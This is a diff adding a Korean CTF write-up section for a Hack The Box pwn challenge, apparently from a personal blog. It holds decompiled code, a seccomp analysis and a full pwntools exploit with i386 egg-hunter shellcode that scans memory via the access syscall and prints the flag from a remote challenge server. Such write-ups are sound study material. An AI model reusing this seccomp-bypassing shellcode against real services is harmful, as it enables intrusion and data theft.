@@ -543,4 +543,168 @@ r.interactive()
 
 이 문제는 디버깅 심볼이 없어서 더 까다로웠다.
 
+먼저 _start 함수에서 엔트리 포인트를 찾아서 main 함수를 찾았다.
+
+다음은 main 함수이다. 기능은 주석으로 적어놓았다.
+
+```c
+int __cdecl main(int argc, const char **argv, const char **envp)
+{
+  int v4; // [esp-10h] [ebp-24h]
+  int v5; // [esp-Ch] [ebp-20h]
+  int v6; // [esp-8h] [ebp-1Ch]
+  int v7; // [esp-4h] [ebp-18h]
+  void *buf; // [esp+0h] [ebp-14h]
+  char *dest; // [esp+4h] [ebp-10h]
+  void *addr; // [esp+8h] [ebp-Ch]
+
+  addr = sub_12E8();                            // random 한 주소 
+  signal(14, &exit);                            // sigalrm
+  alarm(3u);
+  dest = mmap(addr, 0x1000u, 3, 49, -1, 0);     // rw 권한 부여
+  if ( dest == -1 )                             // mmap 실패하면 실행
+    (sub_1118)(-1, v4, v5, v6);
+  strcpy(dest, aHtbXxxxxxxxxxx);                // flag를 mmap 반환 주소로 복사
+  memset(aHtbXxxxxxxxxxx, 0, sizeof(aHtbXxxxxxxxxxx));// 전역 변수 주소에 있는 flag는 초기화시켜줌
+  sub_1259();                                   // seccomp filter
+  buf = malloc(60u);
+  read(0, buf, 60u);
+  (buf)(v7, buf, 0);
+  return 0;
+}
+```
+
+전역변수에 저장된 aHtbXxxxxxxxxxx 는 실제 서버에서 flag가 있을 것이다. 그 값을 mmap을 통해 받아온 가상 주소에 담아놓고 전역변수는 0으로 초기화시킨다.
+
+마지막 코드부분에서 buf를 호출하는데 NX bit 보호기법이 걸려있지 않기 때문에 여기에 쉘코드를 넣으면 셸이 따질 것이다. 하지만 그 전에 sub_1259 함수에서 seccomp filter 를 통해 다음 조건일 때 프로그램을 SIGKILL을 발생시킨다.
+
+![Untitled](/assets/images/htb/pwn/Untitled%2027.png)
+
+평범한 쉘코드로는 익스플로잇을 진행할 수 없다.
+
+그러면 어떤 syscall number를 사용해야할까가 이 문제의 포인트인데 write, read 등의 syscall은 막히지 않았다. 따라서 mmap으로 받아온 가상 주소에 담긴 flag값을 write syscall로  출력시키는 방향으로 진행해야한다.
+
+하지만 또 문제가 있다. mmap으로 받아온 가상 주소에 flag가 있는데 이 주소는 랜덤한 주소라 예측할 수 없고, buf를 call 하기 전에 스택에서 이 가상 주소값을 정리하기 때문에 쉘코드 내에서 flag가 저장된 주소를 알 방법이 없었다.
+
+구글링을 통해 memory를 search해서 flag를 찾는 방식을 찾을 수 있었다. access syscall을 이용하는 방식인데 access 함수는 파일의 권한 여부를 확인하는 함수이다.
+
+먼저 랜덤으로 생성되는 주소의 범위는 처음 함수 sub_12E8과 같다.
+
+```c
+int sub_12E8()
+{
+  unsigned int buf; // [esp+0h] [ebp-18h] BYREF
+  int fd; // [esp+8h] [ebp-10h]
+  int i; // [esp+Ch] [ebp-Ch]
+
+  fd = open("/dev/urandom", 0);
+  read(fd, &buf, 8u);
+  close(fd);
+  srand(buf);
+  for ( i = 0; i <= 0x5FFFFFFF; i = rand() << 16 )
+    ;
+  return i;
+}
+```
+
+대충 0x5FFFFFFF 보다 크고, 뒤에 2바이트가 0000이다.
+
+따라서 초기값을 0x5FFFFFFF + 1로 하고, 뒷 바이트 0x10000만큼 증가시켜서 flag 문자열 “HTB{” 를 검색한다.
+
+만약 해당 주소에 주소가 유효하지 않은 주소면 Segment Fault가 발생할텐데 이를 방지하기 위해 access 함수를 이용한다. 따라서 “HTB{” 를 검색하면서도 Segment Fault가 발생하지 않게 할 수 있다. 
+
+만약 해당하는 주소가 유효하지 않다면 i386 기준으로 다음과 같은 값을 리턴하는데 시스템 상으로는 0xf2 값으로 된다.. 이건 잘 모르겠다. (not 0xf2 == 13이긴 한데..)
+
+![Untitled](/assets/images/htb/pwn/Untitled%2028.png)
+
+위의 내용들은 참고해서 코드를 작성하고, 다음과 같은 코드를 obdump 를 통해 기계어로 얻어와서, 약간의 코드를 수정하여 쉘코드를 완성하였다. (null 바이트 제거, 간소화 등등)
+
+```c
+#include<stdlib.h>
+#include<stdio.h>
+
+int main() {
+  for (int address = 0x60000000; address < 0x7fffffff; address += 0x10000) {
+      if (access(address, 0) == 0xf2) continue;
+      if (*(int*)address == "HTB{") {
+            write(1, address, 36);
+      }
+  }
+}
+```
+
+또한, 문제 바이너리 파일의 main 함수에서 처음에 signal 함수와 alarm 함수를 통해 3초 뒤에 exit 함수를 호출하므로, alarm 함수를 syscall하여 시간을 늘려줘야했다.
+
+**32bit와 64bit간의 syscall 인자 전달 방식**
+
+32bit 에서 함수를 호출할 때 인자를 각각 스택순으로 가져가게 되는데 syscall 에서는 스택이 아닌 레지스터의 값을 이용하여 인자를 가져간다.
+
+- 32bit 는 eax에 syscall number를 그 다음 ebx, ecx, edx 순으로 인자의 값을 넣는다.
+- 64bit 는 rax에 syscall number를 그 다음 rdi, rsi, rdx, rcx, r8, r9 순으로 넣는다.
+
+해당 레지스터 이후 인자들은 32bit나 64bit나 스택에서 참조한다.
+
+최종적으로 다음과 같이 페이로드를 작성하였다.
+
+**페이로드**
+
+```python
+from pwn import *
+
+context.arch = 'i386'
+
+#r = process('./hunting')
+r = remote('157.245.33.77', 31923)
+
+sc = '''
+//alarm(16)
+  push   0x1b
+  pop    eax
+  push   0x10
+  pop    ebx
+  int    0x80
+
+//access(address, 0) == 0xf2 then next label
+  xor    eax, eax
+  mov    al, 0x21
+  mov    ebx, 0x7b425448
+  xor    ecx, ecx
+  mov    edx, 0x5fffffff
+next:
+  or     dx, 0xffff
+  inc    edx
+  pusha
+  lea    ebx, [edx]
+  int    0x80
+  cmp    al, 0xf2
+  popa
+  je     next
+
+//write(1, address, 36)
+  push   edx
+  pop    ecx
+  push   0x24
+  pop    edx
+  push   0x1
+  pop    ebx
+  push   0x4
+  pop    eax
+  int    0x80
+'''
+
+payload = b''
+payload += asm(sc)
+
+print(disasm(payload))
+
+r.sendline(payload)
+
+flag = r.recv()
+print("FLAG : " + flag.decode())
+
+r.close()
+```
+
 ### 플래그 획득
+
+![Untitled](/assets/images/htb/pwn/Untitled%2029.png)
